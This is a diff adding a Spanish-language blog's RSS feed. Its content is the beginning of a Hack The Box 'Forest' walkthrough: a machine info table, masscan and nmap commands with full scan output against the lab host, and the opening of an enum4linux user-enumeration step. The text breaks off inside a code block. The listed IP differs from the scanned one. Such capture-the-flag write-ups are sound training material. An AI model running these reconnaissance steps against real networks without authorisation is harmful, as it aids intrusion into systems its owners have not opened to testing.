@@ -1,0 +1,1223 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>bloodhound on sckull</title>
+    <link>https://sckull.github.io/tags/bloodhound/</link>
+    <description>Recent content in bloodhound on sckull</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>es</language>
+    <copyright>©{year}, All Rights Reserved</copyright>
+    <lastBuildDate>Fri, 10 Jan 2020 00:00:00 +0000</lastBuildDate>
+    <sy:updatePeriod>daily</sy:updatePeriod>
+    <sy:updateFrequency>daily</sy:updateFrequency>
+    
+        <atom:link href="https://sckull.github.io/tags/bloodhound/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+
+      
+      <item>
+        <title>Hack The Box - Forest</title>
+        <link>https://sckull.github.io/posts/forest/</link>
+        <pubDate>Fri, 10 Jan 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Fri, 10 Jan 2020 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/forest/</guid>
+        <description>Forest es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
+        <content:encoded>&lt;p&gt;Forest es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Nombre&lt;/th&gt;
+&lt;th&gt;Forest&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;OS&lt;/td&gt;
+&lt;td&gt;Windows&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Puntos&lt;/td&gt;
+&lt;td&gt;20&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Dificultad&lt;/td&gt;
+&lt;td&gt;Facil&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;IP&lt;/td&gt;
+&lt;td&gt;10.10.10.158&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Maker&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/2984&#34;&gt;mrb3n&lt;/a&gt; &amp;amp; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/1190&#34;&gt;egre55&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
+&lt;p&gt;Escaneo de puerto tcp/udp, en el cual nos muestra varios puertos abiertos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;115
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;116
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;117
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;118
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;119
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;120
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;121
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;122
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;123
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;124
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/forest# masscan -p1-65535,U:1-65535 10.10.10.161 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0
+
+Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-10-25 04:57:31 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+Discovered open port 135/tcp on 10.10.10.161                                   
+Discovered open port 464/tcp on 10.10.10.161                                   
+Discovered open port 49910/tcp on 10.10.10.161                                 
+Discovered open port 58925/udp on 10.10.10.161                                 
+Discovered open port 445/tcp on 10.10.10.161                                   
+Discovered open port 139/tcp on 10.10.10.161                                   
+Discovered open port 49664/tcp on 10.10.10.161                                 
+Discovered open port 9389/tcp on 10.10.10.161                                  
+Discovered open port 49671/tcp on 10.10.10.161                                 
+Discovered open port 49666/tcp on 10.10.10.161                                 
+Discovered open port 3269/tcp on 10.10.10.161                                  
+Discovered open port 593/tcp on 10.10.10.161                                   
+Discovered open port 49667/tcp on 10.10.10.161                                 
+Discovered open port 49676/tcp on 10.10.10.161                                 
+Discovered open port 49703/tcp on 10.10.10.161                                 
+Discovered open port 49684/tcp on 10.10.10.161                                 
+Discovered open port 53/tcp on 10.10.10.161  
+
+&lt;span class=&#34;c1&#34;&gt;# Nmap 7.70 scan initiated Fri Oct 25 01:01:38 2019 as: nmap -p- --min-rate 1000 -o nmap.scan 10.10.10.161&lt;/span&gt;
+Warning: 10.10.10.161 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.161
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.23s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;63731&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;1780&lt;/span&gt; filtered ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49671/tcp open  unknown
+49676/tcp open  unknown
+49677/tcp open  unknown
+49684/tcp open  unknown
+49703/tcp open  unknown
+49910/tcp open  unknown
+
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Oct 25 01:06:47 2019 -- 1 IP address (1 host up) scanned in 308.58 seconds&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;# Nmap 7.70 scan initiated Fri Oct 25 01:08:05 2019 as: nmap -sV -sC -p- --min-rate 1000 -o script_nmap.scan 10.10.10.161&lt;/span&gt;
+Warning: 10.10.10.161 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.161
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.26s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;64311&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;1201&lt;/span&gt; filtered ports
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain?
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   DNSVersionBindReqTCP: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     version
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    &lt;span class=&#34;nb&#34;&gt;bind&lt;/span&gt;
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;server time: 2019-10-25 05:20:03Z&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: htb.local, Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+445/tcp   open  microsoft-ds Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard &lt;span class=&#34;m&#34;&gt;14393&lt;/span&gt; microsoft-ds &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: HTB&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: htb.local, Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49671/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49684/tcp open  msrpc        Microsoft Windows RPC
+49703/tcp open  msrpc        Microsoft Windows RPC
+&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.70%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10/25%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5DB2843D%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DNS
+SF:VersionBindReqTCP,20,&lt;span class=&#34;s2&#34;&gt;&amp;#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x04bind\0\0\x10\0\x03&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+Service Info: Host: FOREST&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 2h27m49s, deviation: 4h02m51s, median: 7m36s
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-os-discovery: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   OS: Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard &lt;span class=&#34;m&#34;&gt;14393&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard 6.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Computer name: FOREST
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NetBIOS computer name: FOREST&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Domain name: htb.local
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Forest name: htb.local
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   FQDN: FOREST.htb.local
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  System time: 2019-10-24T22:23:05-07:00
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-security-mode: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   account_used: &amp;lt;blank&amp;gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   authentication_level: user
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   challenge_response: supported
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  message_signing: required
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled and required
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2019-10-25 01:22:33
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: 2019-10-25 00:22:54
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Oct 25 01:16:55 2019 -- 1 IP address (1 host up) scanned in 529.48 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;enum4linux&#34;&gt;ENUM4LINUX&lt;/h2&gt;
+&lt;p&gt;Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba con enum4linux, enumerando los usuarios dentro de la maquina.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
